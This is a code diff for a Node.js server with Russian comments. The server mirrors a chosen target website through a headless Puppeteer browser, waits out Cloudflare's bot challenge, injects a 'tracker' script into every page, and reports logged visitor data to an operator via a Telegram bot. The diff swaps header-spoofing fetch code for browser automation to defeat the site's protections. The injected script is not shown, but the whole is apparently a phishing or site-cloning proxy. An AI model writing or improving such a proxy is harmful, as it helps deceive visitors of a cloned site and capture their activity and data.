@@ -2,7 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const { Pool } = require('pg');
-const { HttpsProxyAgent } = require('https-proxy-agent');
+const puppeteer = require('puppeteer');
 
 const app = express();
 app.use(express.json());
@@ -14,10 +14,34 @@ const pool = new Pool({ connectionString: process.env.DATABASE_URL });
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 const ADMIN_ID = process.env.ADMIN_CHAT_ID;
 const TARGET_SITE = process.env.TARGET_SITE || 'https://example.com';
+const PROXY_URL = process.env.PROXY_URL;
 
-// Прокси (опционально)
-const PROXY_URL = process.env.PROXY_URL; // например: http://user:pass@proxy.com:8080
-const proxyAgent = PROXY_URL ? new HttpsProxyAgent(PROXY_URL) : null;
+// Браузер
+let browser = null;
+
+async function getBrowser() {
+  if (!browser) {
+    const args = [
+      '--no-sandbox',
+      '--disable-setuid-sandbox',
+      '--disable-dev-shm-usage',
+      '--disable-gpu',
+      '--single-process',
+      '--disable-web-security'
+    ];
+    
+    if (PROXY_URL) {
+      args.push(`--proxy-server=${PROXY_URL}`);
+    }
+    
+    browser = await puppeteer.launch({
+      headless: 'new',
+      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
+      args
+    });
+  }
+  return browser;
+}
 
 // Инициализация БД
 async function initDB() {
@@ -109,78 +133,45 @@ app.post('/api/log', async (req, res) => {
   }
 });
 
-// Браузерные заголовки для обхода защиты
-const browserHeaders = {
-  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-  'Accept-Language': 'en-US,en;q=0.9,ru;q=0.8',
-  'Accept-Encoding': 'gzip, deflate, br',
-  'Cache-Control': 'no-cache',
-  'Pragma': 'no-cache',
-  'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-  'Sec-Ch-Ua-Mobile': '?0',
-  'Sec-Ch-Ua-Platform': '"Windows"',
-  'Sec-Fetch-Dest': 'document',
-  'Sec-Fetch-Mode': 'navigate',
-  'Sec-Fetch-Site': 'none',
-  'Sec-Fetch-User': '?1',
-  'Upgrade-Insecure-Requests': '1'
-};
-
-// Прокси для всех запросов
+// Прокси через Puppeteer
 app.get('*', async (req, res) => {
   const url = TARGET_SITE + req.path + (req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '');
-  console.log('Fetching:', url);
+  console.log('Fetching with Puppeteer:', url);
   
+  let page = null;
   try {
-    const fetchOptions = {
-      redirect: 'follow',
-      headers: { ...browserHeaders, 'Referer': TARGET_SITE }
-    };
+    const br = await getBrowser();
+    page = await br.newPage();
     
-    if (proxyAgent) {
-      fetchOptions.agent = proxyAgent;
-    }
+    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+    await page.setViewport({ width: 1920, height: 1080 });
     
-    const response = await fetch(url, fetchOptions);
-    console.log('Response:', response.status, response.headers.get('content-type'));
+    await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
     
-    if (!response.ok) {
-      return res.status(response.status).send(`Ошибка ${response.status}`);
-    }
+    // Ждём прохождения Cloudflare (до 10 сек)
+    await page.waitForFunction(() => !document.title.includes('Just a moment'), { timeout: 10000 }).catch(() => {});
     
-    const contentType = response.headers.get('content-type') || '';
-    res.setHeader('Content-Type', contentType);
+    let html = await page.content();
     
-    // HTML — внедряем трекер
-    if (contentType.includes('text/html')) {
-      let html = await response.text();
-      
-      if (html.includes('</body>')) {
-        html = html.replace('</body>', trackerScript + '</body>');
-      } else if (html.includes('</html>')) {
-        html = html.replace('</html>', trackerScript + '</html>');
-      } else {
-        html += trackerScript;
-      }
-      
-      res.send(html);
+    // Внедряем трекер
+    if (html.includes('</body>')) {
+      html = html.replace('</body>', trackerScript + '</body>');
     } else {
-      const buffer = await response.arrayBuffer();
-      res.send(Buffer.from(buffer));
+      html += trackerScript;
     }
+    
+    res.setHeader('Content-Type', 'text/html');
+    res.send(html);
   } catch (err) {
-    console.error('Proxy error for', url, ':', err.message);
+    console.error('Puppeteer error:', err.message);
     res.status(500).send(`
-      <html>
-        <body style="font-family: sans-serif; padding: 20px;">
-          <h2>❌ Ошибка загрузки</h2>
-          <p><b>URL:</b> ${url}</p>
-          <p><b>Ошибка:</b> ${err.message}</p>
-          <p><b>Прокси:</b> ${PROXY_URL ? 'включён' : 'выключен'}</p>
-        </body>
-      </html>
+      <html><body style="font-family:sans-serif;padding:20px;">
+        <h2>❌ Ошибка загрузки</h2>
+        <p>${err.message}</p>
+      </body></html>
     `);
+  } finally {
+    if (page) await page.close().catch(() => {});
   }
 });
 
@@ -194,34 +185,32 @@ bot.onText(/\/start/, (msg) => {
   });
 });
 
-// Тест прокси
 bot.onText(/\/test/, async (msg) => {
   if (msg.chat.id.toString() !== ADMIN_ID) return;
   
-  let status = '🔧 Диагностика:\n\n';
-  status += `📍 TARGET_SITE: ${TARGET_SITE}\n`;
-  status += `🔒 PROXY: ${PROXY_URL ? 'включён' : 'выключен'}\n\n`;
+  bot.sendMessage(msg.chat.id, '⏳ Тестирую загрузку через Puppeteer...');
   
+  let page = null;
   try {
-    const fetchOptions = {
-      redirect: 'follow',
-      headers: { ...browserHeaders, 'Referer': TARGET_SITE }
-    };
-    if (proxyAgent) fetchOptions.agent = proxyAgent;
+    const br = await getBrowser();
+    page = await br.newPage();
+    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
     
     const start = Date.now();
-    const response = await fetch(TARGET_SITE, fetchOptions);
+    await page.goto(TARGET_SITE, { waitUntil: 'networkidle2', timeout: 30000 });
+    await page.waitForFunction(() => !document.title.includes('Just a moment'), { timeout: 10000 }).catch(() => {});
     const time = Date.now() - start;
     
-    status += `✅ Сайт доступен\n`;
-    status += `⏱ Время: ${time}ms\n`;
-    status += `📊 Статус: ${response.status}\n`;
-    status += `📄 Тип: ${response.headers.get('content-type')?.slice(0, 50)}`;
+    const title = await page.title();
+    
+    bot.sendMessage(msg.chat.id, 
+      `✅ Успешно!\n⏱ Время: ${time}ms\n📄 Заголовок: ${title}\n🔒 Прокси: ${PROXY_URL ? 'да' : 'нет'}`
+    );
   } catch (err) {
-    status += `❌ Ошибка: ${err.message}`;
+    bot.sendMessage(msg.chat.id, `❌ Ошибка: ${err.message}`);
+  } finally {
+    if (page) await page.close().catch(() => {});
   }
-  
-  bot.sendMessage(msg.chat.id, status);
 });
 
 bot.onText(/\/logs/, async (msg) => {
@@ -241,3 +230,9 @@ bot.onText(/\/clear/, async (msg) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log('Server on port ' + PORT));
+
+// Закрытие браузера при выходе
+process.on('SIGTERM', async () => {
+  if (browser) await browser.close();
+  process.exit(0);
+});
